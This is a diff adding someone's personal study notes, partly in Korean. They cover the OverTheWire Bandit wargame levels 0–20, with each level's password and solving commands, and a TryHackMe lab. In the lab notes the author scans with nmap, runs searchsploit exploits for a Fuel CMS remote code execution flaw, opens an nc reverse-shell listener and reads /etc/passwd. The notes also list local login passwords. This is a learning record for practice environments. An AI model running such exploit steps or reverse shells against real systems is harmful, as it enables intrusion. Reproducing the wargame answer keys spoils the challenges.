@@ -1,0 +1,199 @@
+
+---------------------------------------------------------------------------------------------------
+>mkdir --help
+>man mkdir
+>copy file in linux, create directory in linuxpw
+>sudo(super user do) permission/ root user
+
+ssh -p 2220 bandit0@bandit.labs.overthewire.org
+
+
+bandit0: bandit.labs.overthewire.org   bandit0 -> ls, cat
+bandit1: boJ9jbbUNNfktd78OOpsqOltutMc3MY1 -> - : ls >-
+bandit2: CV1DtqXWVFXTvM2F0k09SHz0YwRINYA9 -> ls, cat 'filename',  spaces\ in\ this\ filename
+bandit3: UmHadQclWmgdLOKQ3YNgjWxGoRMb5luK -> ls -al, ls -d  */, cd, cat .hidden
+bandit4: pIwrPrtPN36QITSp3EQaw936yaFoFgAB ->cd, file ./-*, cat ./-file07
+bandit5: koReBOKuIDDepwhWk7jZC0RTdopnAYKh ->find ./* -size 1033c, cat ./07/.file02
+bandit6: DXjZPULLxYr17uwoI01bNLQbtFemEgo7 -> cd /(root directory)
+            find -size 33c -user bandit7 -group bandit7 2> /dev/null
+
+bandit7: HKBPTKQnIay4Fw76bEy8PVxKEDQRKTzs
+cd ~(사용자 홈 이동), pwd(현재 경로확인), ls -l(하위 디렉토리 자세한 내용까지 출력)
+cd .(현재) cd ..(상위) cd /(최상위) cd $변수명(변수저장경로) cd -(이전경로)
+mv 바꿀이름 새로운이름
+
+ssh -p 2220 bandit6@bandit.labs.overthewire.org
+
+bandit8: cvX2JJa4CFALtqS87jk27qwqGhBM9plV ->ls -l, cat data.txt | grep millionth
+bandit9: UsvVyFSfZZWbi6wgC7dAFyFuR6jQQUhR ->cat data.txt | sort | uniq -c
+                           cat data.txt | sort | uniq -c | grep "1 "
+
+bandit10: truKLdjsbJ5g7yyJ2X2R0o3a5HQJFuLk 
+           -> cat data.txt | grep -a "==="(-a 이진수를 문자로 전환)
+           -> strings data.tat | grep "==="
+bandit11:  IFukwKGsFW8MOq3IRFqrxE1hxTNEbUPR ->  base64 --decode data.txt
+bandit12:  5Te8Y4drgCRfCx8ugdwuEX8KFC6k2EUu -> cat data.txt | tr '[A-Za-z]'  '[N-ZA-Mn-za-m]'
+bandit13:  8ZjyCRiBWFYkneahHwxCv3wb2a1ORpYL
+
+         ->mkdir /tmp/exam
+         ->cd /tmp,cd /exam
+         ->~$ cp data.txt /tmp/exam
+         ->:/cd /tmp/exam
+         ->xxd -r data.txt > bandit(16진수를 이진수로 바꾸고 bandit 파일로 저장)
+         ->file bandit(type 확인) -> ls
+         ->mv bandit data2.bin.gz(.gz 파일로 변경) -> ls
+         ->gunzip(gzip) data2.bin.gz(압축해제) ->ls (data2.bin) -> file data2.bin
+         ->mv data2.bin data3.bin.bz2 ->ls(data3.bin.bz2)
+         -> bunzip2 data3.bin.bz2 ->ls(data3.bin) -> file data3.bin
+         ->mv data3.bin data4.bin.gz ->ls(data4.bin.gz)
+         -> gunzip data4.bin.gz ->ls(data4.bin) ->file data4.bin(data4.bin: POSIX tar archive (GNU))
+         -> mv data4.bin data5.bin.tar 
+         ->tar -xvf data5.bin.tar(tar 압축해제) -> ls(data5.bin)
+         -> rm data5.bin.tar(불필요한 데이터 삭제)
+         ->mv data5.bin data6.bin.tar -> tar -xvf data6.bin.tar(압축해제 - data6.bin)
+         -> rm data6.bin.tar(불필요한 데이터 삭제) ->ls
+         ->mv data6.bin data7.bin.bz2(data7.bin.bz2)
+         ->bunzip2 data7.bin.bz2(압축해제 - data7.bin)
+         -> mv, rm, gunzip, bunzip, bunzip2, tar -xvf, file, cat, ls
+
+bandit14: 4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e
+
+         ->ls, cat
+          ->ssh -i sshkey.private bandit14@localhost
+          ->cat /etc/bandit_pass/bandit14
+            
+bandit15: BfMYroe26WYalil77FoDi9qh59eK5xNr
+         
+           ->bandit14@bandit:~$ cat /etc/bandit_pass/bandit14
+           ->4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e
+           ->echo 4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e | nc localhost 30000 
+
+     or  -> ls,  nc localhost 30000, 
+          -> 4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e
+          ->Correct!
+             BfMYroe26WYalil77FoDi9qh59eK5xNr
+
+
+bandit16: cluFn7wTiGryunymYOu4RcffSxQluehd
+
+           
+        ->ls -al
+         ->openssl s_client -connect localhost:30001 -ign_eof
+         ->bandit15 pw:BfMYroe26WYalil77FoDi9qh59eK5xNr 
+         ->correct ->pw
+
+
+bandit17: xLYVMN9WE5zQ5vHacb0sZEVqbrp7nBTn
+   
+        -> nc -zvn 127.0.0.1 31000-32000
+      or->nmap localhost -p 31000-32000
+      or-> nmap --script ssl-enum-ciphers localhost -p31000-32000
+         -> echo cluFn7wTiGryunymYOu4RcffSxQluehd | openssl s_client -quiet -connect localhost:31790 -quiet(살이있는 포토번호 다 입력)
+         -> echo cluFn7wTiGryunymYOu4RcffSxQluehd | openssl s_client -quiet -connect localhost:31790 -quiet >/tmp/tt.cert
+         ->ls -al /tmp/tt.cert
+         ->ssh -i/tmp/tt.cert bandit17@localhost
+         -> chmod 600 /tmp/tt.cert
+         -> ls -al /tmp/tt.cert
+         -> ssh -i/tmp/tt.cert bandit17@localhost
+         ->cat /etc/bandit_pass/bandit17
+  
+bandit18:   kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd
+        ->ls
+        ->diff passwords.new passwords.old
+        ->bandit17 ->ssh bandit18@localhost -t /bin/sh
+           password : kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd
+           Byebye!
+        ->$ ls -al
+        ->cat readme
+          IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x(bandit19-pw)
+         ->exit
+
+bandit19:IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x
+
+bandit20: GbKksEFF4yrVs6il55v6gwY5aVje5f0j
+           ->./bandit20-do
+           ->./bandit20-do id
+           ->   ->./bandit20-do cat /etc/bandit_pass/bandit20
+
+
+
+
+---------------------------------------------------------------------------
+kail linux -hacking
+>id kali pw:kali
+root >pw savinci
+>sudo apt-get install update
+>sudo apt-get install upgrade
+downloads>openvpn lowdeep1004.ovpn :vpn연결
+tryhackme.com>learn>search>ignite
+>ipconfig  *네이버 해킹작업소 참조 - ip address
+>nmap ip주소 - port 번호
+>wireshark >tun0 :data주고받는 거 확인 더블클리후
+>nmap address
+>namp -sV -sC address >scan_res :저장
+>search 
+1# apache httpd 2.4.18 vulnerability
+2# exploit-db.com
+3>serachsploit apache httpd 2.4.18 / Fuel CMS 1.4
+  - RCE Code Injdection
+  - Command Execution
+>ls -l /usr/share/exploitdb/exploits/
+>cp /usr/share/exploitdb/exploits/ ./exploit1/2/3
+>python2 exploit1.py
+>gem install docopt
+>ruby exploit2.rb
+>ruby exploit2.rb http://10.10.166.103/ id
+>ruby exploit2.rb http://10.10.166.103/ ls
+
+README.md
+assets
+composer.json
+contributing.md
+fuel
+index.php
+robots.txt
+
+>python exploit3.py -u http://10.10.166.103/
+[+]Connecting...
+Enter Command $ ls/ id
+
+>nc -nlvp 9999
+ listening on
+*google >reverse shell cheatsheet
+ -reverse-shell-generator 
+ -ip>linux>nc mkfifo
+>cat /etc/passwd
+>cat /etc/passwd | grep sh
+
+
+
+
+*redare2
+>sudo git https://github.com/mattetti/ILOI-carckme.git
+>savinci/redare2/IOLI-crackme/bin-linux
+
+-------------------------------------------------------
+*
+>objdump -S a.out
+>readelf -h a.out
+>readelf -headers a.out
+
+----------------------------------------------------------
+>sudo apt update
+>apt list | grep name
+
+----------------------------------------------------------
+how to download hangul in kali linux
+
+>sudo su - root
+>apt -y update
+>apt -y upgrade
+>apt-get install fcitx-hangul
+>apt-get install fcitx-lib*
+>apt-get install fonts-nanum*
+>reboot
+
+how to download google in kali linux
+
+>
+
